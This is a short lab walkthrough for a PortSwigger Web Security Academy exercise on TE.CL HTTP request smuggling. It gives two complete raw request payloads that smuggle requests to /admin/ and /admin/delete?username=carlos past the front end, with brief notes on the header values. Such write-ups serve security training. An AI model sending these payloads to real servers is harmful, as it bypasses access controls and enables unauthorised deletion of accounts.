# [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

> delete the **carlos** user with the TE.CL vulnerability already know

- you will need 4 request in 2 steps

## first step -> get to the admin page

> first request:

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

3a
GET /admin/ HTTP/1.1
Host: localhost
Content-Length: 6

0

```

- the frontend lets the request trough because it satisfies the `Transfer-Encoding: chunked`
- the backend will chop off the `GET /admin ...` because of the `Content-Length: 4`
- the `GET /admin ...` part will be appended to the next request
- the `Host` needs to be set to `localhost` because the admin only available from there (since the request is already in)
- `Content-Length` is set to `6` because the `0\r\n\r\n` is `5` bytes but need to append the next request to it as well that is why it is `6`

> second request: just the base `/` request

- this will let you in the admin page where the users can be found

## second step -> delete carlos

> first request:

- from the first step copy the carlos delete link and add it to the `GET`

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

50
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 6

0

```

> second request: just the base `/` request

- it will response with a `302`
